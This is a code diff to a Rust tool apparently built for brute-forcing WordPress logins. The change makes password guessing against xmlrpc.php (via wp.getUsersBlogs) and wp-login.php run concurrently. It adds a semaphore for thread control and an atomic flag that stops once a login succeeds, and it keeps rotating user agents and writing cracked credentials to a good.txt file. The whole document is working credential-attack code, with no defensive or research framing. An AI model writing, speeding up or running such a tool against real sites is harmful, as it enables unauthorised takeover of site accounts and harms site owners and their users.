@@ -3,6 +3,7 @@ use regex::Regex;
 use reqwest::header::{CONTENT_TYPE, USER_AGENT};
 use std::fs;
 use std::io::{self, BufRead, Write};
+use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::Arc;
 use tokio::sync::Semaphore;
 use tokio::time::Duration;
@@ -233,58 +234,86 @@ impl Brute {
     // ── XML-RPC Brute Force ──────────────────────────────────────────────
 
     async fn brute_xmlrpc(&self, username: &str, passwords: &[String]) -> bool {
-        let endpoint = format!("{}/xmlrpc.php", self.url);
-        let ua = self.ua();
+        let endpoint = Arc::new(format!("{}/xmlrpc.php", self.url));
+        let found = Arc::new(AtomicBool::new(false));
+        let sem = Arc::new(Semaphore::new(self.thread_count));
+        let mut handles = vec![];
 
         for password in passwords {
-            let payload = format!(
-                r#"<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{}</value></param><param><value>{}</value></param></params></methodCall>"#,
-                username, password
-            );
+            if found.load(Ordering::Relaxed) {
+                break;
+            }
 
-            let res = self
-                .client
-                .post(&endpoint)
-                .header(CONTENT_TYPE, "text/xml")
-                .header(USER_AGENT, &ua)
-                .timeout(Duration::from_secs(10))
-                .body(payload)
-                .send()
-                .await;
+            let sem = sem.clone();
+            let found = found.clone();
+            let client = self.client.clone();
+            let endpoint = endpoint.clone();
+            let ua = self.ua();
+            let url = self.url.clone();
+            let username = username.to_string();
+            let password = password.clone();
 
-            match res {
-                Ok(resp) => {
-                    let text = resp.text().await.unwrap_or_default();
-                    if text.contains("<member><name>isAdmin</name><value>") {
-                        println!(
-                            "[{}] {} => {}",
-                            "XMLRPC".yellow(),
-                            self.url,
-                            format!("{}|{}", username, password).green()
-                        );
-                        save_content(
-                            "good.txt",
-                            &format!("{}/wp-login.php#{}@{}", self.url, username, password),
-                        )
-                        .await;
-                        return true;
-                    } else {
-                        println!(
-                            "[{}] {} => {}",
-                            "XMLRPC".yellow(),
-                            self.url,
-                            format!("{}|{}", username, password).red()
-                        );
+            handles.push(tokio::spawn(async move {
+                let _permit = sem.acquire().await.unwrap();
+                if found.load(Ordering::Relaxed) {
+                    return false;
+                }
+
+                let payload = format!(
+                    r#"<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{}</value></param><param><value>{}</value></param></params></methodCall>"#,
+                    username, password
+                );
+
+                let res = client
+                    .post(endpoint.as_str())
+                    .header(CONTENT_TYPE, "text/xml")
+                    .header(USER_AGENT, &ua)
+                    .timeout(Duration::from_secs(10))
+                    .body(payload)
+                    .send()
+                    .await;
+
+                match res {
+                    Ok(resp) => {
+                        let text = resp.text().await.unwrap_or_default();
+                        if text.contains("<member><name>isAdmin</name><value>") {
+                            found.store(true, Ordering::Relaxed);
+                            println!(
+                                "[{}] {} => {}",
+                                "XMLRPC".yellow(),
+                                url,
+                                format!("{}|{}", username, password).green()
+                            );
+                            save_content(
+                                "good.txt",
+                                &format!("{}/wp-login.php#{}@{}", url, username, password),
+                            )
+                            .await;
+                            return true;
+                        } else {
+                            println!(
+                                "[{}] {} => {}",
+                                "XMLRPC".yellow(),
+                                url,
+                                format!("{}|{}", username, password).red()
+                            );
+                        }
+                    }
+                    Err(e) => {
+                        if e.is_timeout() {
+                            println!("[{}] {} => {}", "#".red(), url, "Timeout".red());
+                        } else {
+                            println!("[{}] {} => {}", "#".red(), url, format!("{}", e).red());
+                        }
                     }
                 }
-                Err(e) => {
-                    if e.is_timeout() {
-                        self.failed("Timeout");
-                    } else {
-                        self.failed(&format!("{}", e));
-                    }
-                    tokio::time::sleep(Duration::from_secs(3)).await;
-                }
+                false
+            }));
+        }
+
+        for handle in handles {
+            if let Ok(true) = handle.await {
+                return true;
             }
         }
         false
@@ -293,60 +322,89 @@ impl Brute {
     // ── WP-Login Brute Force ─────────────────────────────────────────────
 
     async fn brute_wp_login(&self, username: &str, passwords: &[String]) -> bool {
-        let endpoint = format!("{}/wp-login.php", self.url);
-        let ua = self.ua();
+        let endpoint = Arc::new(format!("{}/wp-login.php", self.url));
+        let found = Arc::new(AtomicBool::new(false));
+        let sem = Arc::new(Semaphore::new(self.thread_count));
+        let mut handles = vec![];
 
         for password in passwords {
-            let params = [
-                ("log", username.to_string()),
-                ("pwd", password.clone()),
-                ("wp-submit", "Log-In".to_string()),
-                ("redirect_to", format!("{}/wp-admin/", self.url)),
-                ("testcookie", "1".to_string()),
-            ];
+            if found.load(Ordering::Relaxed) {
+                break;
+            }
 
-            let res = self
-                .client
-                .post(&endpoint)
-                .header(USER_AGENT, &ua)
-                .header(CONTENT_TYPE, "application/x-www-form-urlencoded")
-                .form(&params)
-                .timeout(Duration::from_secs(10))
-                .send()
-                .await;
+            let sem = sem.clone();
+            let found = found.clone();
+            let client = self.client.clone();
+            let endpoint = endpoint.clone();
+            let ua = self.ua();
+            let url = self.url.clone();
+            let username = username.to_string();
+            let password = password.clone();
 
-            match res {
-                Ok(resp) => {
-                    let text = resp.text().await.unwrap_or_default();
-                    if text.contains("/wp-admin/admin-ajax.php") || text.contains("dashboard") {
-                        println!(
-                            "[{}] {} => {}",
-                            "WPLOGIN".blue(),
-                            self.url,
-                            format!("{}|{}", username, password).green()
-                        );
-                        save_content(
-                            "good.txt",
-                            &format!("{}/wp-login.php#{}@{}", self.url, username, password),
-                        )
-                        .await;
-                        return true;
-                    } else {
-                        println!(
-                            "[{}] {} => {}",
-                            "WPLOGIN".blue(),
-                            self.url,
-                            format!("{}|{}", username, password).red()
-                        );
+            handles.push(tokio::spawn(async move {
+                let _permit = sem.acquire().await.unwrap();
+                if found.load(Ordering::Relaxed) {
+                    return false;
+                }
+
+                let params = [
+                    ("log", username.as_str()),
+                    ("pwd", password.as_str()),
+                    ("wp-submit", "Log-In"),
+                    ("redirect_to", &format!("{}/wp-admin/", url)),
+                    ("testcookie", "1"),
+                ];
+
+                let res = client
+                    .post(endpoint.as_str())
+                    .header(USER_AGENT, &ua)
+                    .header(CONTENT_TYPE, "application/x-www-form-urlencoded")
+                    .form(&params)
+                    .timeout(Duration::from_secs(10))
+                    .send()
+                    .await;
+
+                match res {
+                    Ok(resp) => {
+                        let text = resp.text().await.unwrap_or_default();
+                        if text.contains("/wp-admin/admin-ajax.php") || text.contains("dashboard") {
+                            found.store(true, Ordering::Relaxed);
+                            println!(
+                                "[{}] {} => {}",
+                                "WPLOGIN".blue(),
+                                url,
+                                format!("{}|{}", username, password).green()
+                            );
+                            save_content(
+                                "good.txt",
+                                &format!("{}/wp-login.php#{}@{}", url, username, password),
+                            )
+                            .await;
+                            return true;
+                        } else {
+                            println!(
+                                "[{}] {} => {}",
+                                "WPLOGIN".blue(),
+                                url,
+                                format!("{}|{}", username, password).red()
+                            );
+                        }
+                    }
+                    Err(e) => {
+                        if e.is_timeout() {
+                            println!("[{}] {} => {}", "#".red(), url, "Timeout".red());
+                        } else {
+                            println!("[{}] {} => {}", "#".red(), url, format!("{}", e).red());
+                        }
                     }
                 }
-                Err(e) => {
-                    if e.is_timeout() {
-                        self.failed("Timeout");
-                    } else {
-                        self.failed(&format!("{}", e));
-                    }
-                }
+                false
+            }));
+        }
+
+        for handle in handles {
+            if let Ok(true) = handle.await {
+                return true;
             }
         }
         false
@@ -375,38 +433,34 @@ impl Brute {
             return;
         }
 
-        let semaphore = Arc::new(Semaphore::new(self.thread_count));
-
         for user in &usernames {
             let passwords = self.set_password(user);
             let mut handles = vec![];
 
             if self.xmlrpc_lean {
-                let sem = semaphore.clone();
                 let url = self.url.clone();
                 let ua_pool = self.user_agents.clone();
                 let user = user.clone();
                 let passwords = passwords.clone();
                 let pw_template = self.password_template.clone();
+                let tc = self.thread_count;
 
                 handles.push(tokio::spawn(async move {
-                    let _permit = sem.acquire().await.unwrap();
-                    let brute = Brute::new(url, 1, ua_pool, pw_template);
+                    let brute = Brute::new(url, tc, ua_pool, pw_template);
                     brute.brute_xmlrpc(&user, &passwords).await
                 }));
             }
 
             if self.wplogin_lean {
-                let sem = semaphore.clone();
                 let url = self.url.clone();
                 let ua_pool = self.user_agents.clone();
                 let user = user.clone();
                 let passwords = passwords.clone();
                 let pw_template = self.password_template.clone();
+                let tc = self.thread_count;
 
                 handles.push(tokio::spawn(async move {
-                    let _permit = sem.acquire().await.unwrap();
-                    let brute = Brute::new(url, 1, ua_pool, pw_template);
+                    let brute = Brute::new(url, tc, ua_pool, pw_template);
                     brute.brute_wp_login(&user, &passwords).await
                 }));
             }
